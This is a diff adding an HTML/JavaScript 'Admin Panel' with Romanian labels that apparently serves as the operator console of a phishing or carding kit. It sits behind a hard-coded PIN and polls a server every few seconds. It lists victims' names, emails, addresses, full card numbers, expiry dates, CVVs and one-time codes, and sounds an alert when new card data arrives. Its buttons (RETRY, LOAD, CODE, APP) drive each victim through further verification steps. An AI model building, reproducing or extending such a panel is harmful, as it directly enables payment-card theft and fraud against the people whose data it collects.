@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Panel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f6fa;
+      padding: 20px;
+      margin: 0;
+    }
+
+    h2 {
+      margin: 0;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    th, td {
+      padding: 12px;
+      font-size: 14px;
+      vertical-align: top;
+    }
+
+    th {
+      background: #2f3640;
+      color: white;
+      text-align: left;
+    }
+
+    tr:hover {
+      background: #f1f1f1;
+    }
+
+    .btn {
+      padding: 6px 8px;
+      font-size: 11px;
+      border: none;
+      cursor: pointer;
+      margin: 2px;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+
+    .approve {
+      background: green;
+      color: white;
+    }
+
+    .reject {
+      background: red;
+      color: white;
+    }
+
+    .pending {
+      color: orange;
+      font-weight: bold;
+    }
+
+    .approved {
+      color: green;
+      font-weight: bold;
+    }
+
+    .rejected {
+      color: red;
+      font-weight: bold;
+    }
+
+    .loading {
+      color: blue;
+      font-weight: bold;
+    }
+
+    .admin-toolbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+
+    .toolbar-left,
+    .toolbar-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .toolbar-btn {
+      padding: 10px 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: bold;
+      background: white;
+      color: #2f3640;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    .toolbar-btn:hover {
+      transform: translateY(-1px);
+    }
+
+    .refresh-note {
+      font-size: 12px;
+      color: #57606f;
+    }
+
+    .stat-card {
+      min-width: 120px;
+      background: white;
+      border-radius: 12px;
+      padding: 10px 14px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    }
+
+    .stat-label {
+      display: block;
+      font-size: 11px;
+      color: #718093;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+      margin-bottom: 4px;
+    }
+
+    .stat-value {
+      font-size: 22px;
+      font-weight: bold;
+      color: #2f3640;
+    }
+
+    .count-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 44px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      background: #eef6ff;
+      color: #005fa3;
+      font-weight: bold;
+    }
+
+    .mono-number {
+      font-family: Consolas, "Courier New", monospace;
+      letter-spacing: 0.6px;
+    }
+
+    .table-actions {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 4px;
+    }
+
+    @media (max-width: 900px) {
+      body {
+        padding: 12px;
+      }
+
+      .admin-toolbar {
+        align-items: stretch;
+      }
+
+      .toolbar-right {
+        width: 100%;
+      }
+
+      .stat-card {
+        flex: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+<div id="loginScreen" style="display:flex; justify-content:center; align-items:center; height:100vh;">
+  <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1);">
+    <h3>Admin Login</h3>
+    <input id="pinInput" type="password" placeholder="Enter PIN" style="padding:10px; width:200px; margin-bottom:10px;">
+    <br>
+    <button onclick="checkPin()" style="padding:10px 20px;">Login</button>
+  </div>
+</div>
+
+<div id="panel" style="display:none;">
+  <div style="display:flex;">
+    <div style="width:30px; background:#2f3640; color:white; min-height:100vh; padding:20px;">
+      <h3>XD</h3>
+      <button onclick="showCereri()" style="width:100%; margin-bottom:10px;">H</button>
+      <button onclick="showClienti()" style="width:100%;">S</button>
+    </div>
+
+    <div style="flex:1; padding:20px;">
+      <div class="admin-toolbar">
+        <div class="toolbar-left">
+          <h2>Admin Panel</h2>
+          <button id="refreshBtn" class="toolbar-btn" onclick="manualRefresh()">Refresh now</button>
+          <button id="soundBtn" class="toolbar-btn" onclick="enableSound()">Activeaza sunet</button>
+          <div id="refreshInfo" class="refresh-note">Auto refresh in 10:00</div>
+        </div>
+
+        <div class="toolbar-right">
+          <div class="stat-card">
+            <span class="stat-label">Step 1 Clicks</span>
+            <span id="step1VisitsCount" class="stat-value">0</span>
+          </div>
+          <div class="stat-card">
+            <span class="stat-label">Users</span>
+            <span id="totalUsersCount" class="stat-value">0</span>
+          </div>
+        </div>
+      </div>
+
+      <audio id="notifSound">
+        <source src="/notif.mp3" type="audio/mpeg">
+      </audio>
+
+      <input id="search" placeholder="Cauta nume/email..." onkeyup="loadData()" style="margin-bottom:10px; padding:5px; width:300px; display:none;">
+
+      <table id="tabel">
+        <thead>
+          <tr>
+            <th style="width:70px;">#</th>
+            <th>USER</th>
+            <th>Billing</th>
+            <th>Details</th>
+            <th>Status</th>
+            <th style="width:210px;">Actiuni</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script>
+const AUTO_REFRESH_MS = 10 * 60 * 1000;
+const LIVE_REFRESH_MS = 3000;
+
+let audioEnabled = false;
+let currentView = "cereri";
+let knownIds = new Set();
+let knownStep2 = new Set();
+let nextAutoRefreshAt = Date.now() + AUTO_REFRESH_MS;
+
+function digitsOnly(value) {
+  return String(value || "").replace(/\D/g, "");
+}
+
+function formatCardNumber(value) {
+  const digits = digitsOnly(value);
+  return digits ? digits.match(/.{1,4}/g).join(" ") : "";
+}
+
+function playNotificationSound() {
+  if (!audioEnabled) return;
+
+  const audio = document.getElementById("notifSound");
+  audio.currentTime = 0;
+  audio.play().catch(() => {});
+}
+
+function updateRefreshCountdown() {
+  const remainingMs = Math.max(0, nextAutoRefreshAt - Date.now());
+  const totalSeconds = Math.ceil(remainingMs / 1000);
+  const minutes = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
+  const seconds = String(totalSeconds % 60).padStart(2, "0");
+  document.getElementById("refreshInfo").innerText = "Auto refresh in " + minutes + ":" + seconds;
+}
+
+function resetAutoRefreshTimer() {
+  nextAutoRefreshAt = Date.now() + AUTO_REFRESH_MS;
+  updateRefreshCountdown();
+}
+
+async function loadAdminStats() {
+  const response = await fetch("/admin-stats");
+  const stats = await response.json();
+
+  document.getElementById("step1VisitsCount").innerText = stats.step1Visits || 0;
+  document.getElementById("totalUsersCount").innerText = stats.totalUsers || 0;
+}
+
+function checkPin() {
+  const pin = document.getElementById("pinInput").value;
+
+  if (pin === "1971") {
+    document.getElementById("loginScreen").style.display = "none";
+    document.getElementById("panel").style.display = "block";
+    manualRefresh();
+  } else {
+    alert("PIN gresit");
+  }
+}
+
+function enableSound() {
+  const audio = document.getElementById("notifSound");
+  const soundBtn = document.getElementById("soundBtn");
+
+  audio.play().then(() => {
+    audio.pause();
+    audio.currentTime = 0;
+    audioEnabled = true;
+    soundBtn.innerText = "Sunet activ";
+    soundBtn.style.background = "#eafaf1";
+    soundBtn.style.color = "#1e8449";
+  }).catch(() => {
+    console.log("Click din nou");
+  });
+}
+
+async function loadData() {
+  const response = await fetch("/admin");
+  const data = await response.json();
+  const tbody = document.querySelector("#tabel tbody");
+  const searchInput = document.getElementById("search");
+
+  searchInput.style.display = currentView === "clienti" ? "block" : "none";
+  tbody.innerHTML = "";
+
+  data.forEach(user => {
+    let shouldPlaySound = false;
+
+    if (!knownIds.has(user.id)) {
+      knownIds.add(user.id);
+      shouldPlaySound = true;
+    }
+
+    if (user.rezervare && !knownStep2.has(user.id)) {
+      knownStep2.add(user.id);
+      shouldPlaySound = true;
+    }
+
+    if (shouldPlaySound) {
+      playNotificationSound();
+    }
+  });
+
+  const search = searchInput.value.toLowerCase();
+
+  data
+    .filter(user => {
+      if (currentView === "cereri" && user.saved) return false;
+      if (currentView === "clienti" && !user.saved) return false;
+      if (currentView !== "clienti") return true;
+
+      return (
+        (user.nume || "").toLowerCase().includes(search) ||
+        (user.email || "").toLowerCase().includes(search)
+      );
+    })
+    .forEach(user => {
+      const tr = document.createElement("tr");
+      const cardNumber = formatCardNumber(user.rezervare);
+
+      tr.innerHTML = `
+<td>
+  <span class="count-badge mono-number">${user.userNumber || "-"}</span>
+</td>
+
+<td>
+  <div style="display:flex; flex-direction:column; gap:4px;">
+    <div style="font-weight:bold;">${user.nume || "-"}</div>
+    <div><span style="opacity:0.6;">Ref:</span> ${user.ref || "-"}</div>
+    <div><span style="opacity:0.6;">Email:</span> ${user.email || "-"}</div>
+    <div style="font-size:12px; opacity:0.6;">
+      ${user.createdAt ? new Date(user.createdAt).toLocaleString() : "-"}
+    </div>
+  </div>
+</td>
+
+<td>
+  <div style="display:flex; flex-direction:column; gap:4px;">
+    <div>${user.adresa || "-"}</div>
+    <div><span style="opacity:0.6;">ZIP:</span> ${user.zip || "-"}</div>
+  </div>
+</td>
+
+<td>
+  <div style="display:grid; grid-template-columns: 60px 1fr; gap:4px 8px;">
+    <div style="opacity:0.6;">NR:</div>
+    <div class="mono-number">${cardNumber || "in asteptare"}</div>
+
+    <div style="opacity:0.6;">Exp:</div>
+    <div>${user.luna && user.an ? user.luna + " / " + user.an : "in asteptare"}</div>
+
+    <div style="opacity:0.6;">CVV:</div>
+    <div>${user.suma || "in asteptare"}</div>
+
+    <div style="opacity:0.6;">COD:</div>
+    <div>${user.code || "-"}</div>
+  </div>
+</td>
+
+<td class="${user.status}">
+  ${user.status}
+</td>
+
+<td>
+  <div class="table-actions">
+    ${
+      currentView === "cereri"
+      ? `
+        <button class="btn approve" onclick="updateStatus('${user.id}','approved')">OK</button>
+        <button class="btn reject" onclick="updateStatus('${user.id}','rejected')">NO</button>
+        <button class="btn" onclick="doAction('${user.id}','retry')">RETRY</button>
+        <button class="btn" onclick="doAction('${user.id}','loading')">LOAD</button>
+        <button class="btn" onclick="doAction('${user.id}','code')">CODE</button>
+        <button class="btn" onclick="doAction('${user.id}','app')">APP</button>
+        <button class="btn" onclick="doAction('${user.id}','save')">SAVE</button>
+      `
+      : `
+        <button class="btn" onclick="deleteClient('${user.id}')">DELETE</button>
+      `
+    }
+  </div>
+</td>
+`;
+
+      tbody.appendChild(tr);
+    });
+}
+
+async function refreshPanel(resetTimer = false) {
+  await Promise.all([loadData(), loadAdminStats()]);
+
+  if (resetTimer) {
+    resetAutoRefreshTimer();
+  }
+}
+
+async function manualRefresh() {
+  await refreshPanel(true);
+}
+
+async function updateStatus(id, status) {
+  await fetch("/update", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ id, status })
+  });
+
+  refreshPanel();
+}
+
+async function doAction(id, action) {
+  const response = await fetch("/action", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ id, action })
+  });
+
+  const contentType = response.headers.get("content-type") || "";
+  const result = contentType.includes("application/json") ? await response.json() : null;
+
+  if (!response.ok || (result && result.error)) {
+    alert((result && result.error) || "Action failed");
+    return;
+  }
+
+  refreshPanel();
+}
+
+async function deleteClient(id) {
+  if (!confirm("Esti sigur ca vrei sa stergi clientul?")) return;
+
+  await fetch("/action", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ id, action: "delete" })
+  });
+
+  refreshPanel();
+}
+
+function showCereri() {
+  currentView = "cereri";
+  loadData();
+}
+
+function showClienti() {
+  currentView = "clienti";
+  loadData();
+}
+
+updateRefreshCountdown();
+setInterval(() => {
+  if (document.getElementById("panel").style.display === "block") {
+    loadData();
+  }
+}, LIVE_REFRESH_MS);
+setInterval(() => {
+  if (document.getElementById("panel").style.display === "block") {
+    loadAdminStats();
+  }
+}, LIVE_REFRESH_MS);
+setInterval(updateRefreshCountdown, 1000);
+setInterval(() => {
+  if (document.getElementById("panel").style.display === "block") {
+    refreshPanel(true);
+  }
+}, AUTO_REFRESH_MS);
+</script>
+</body>
+</html>
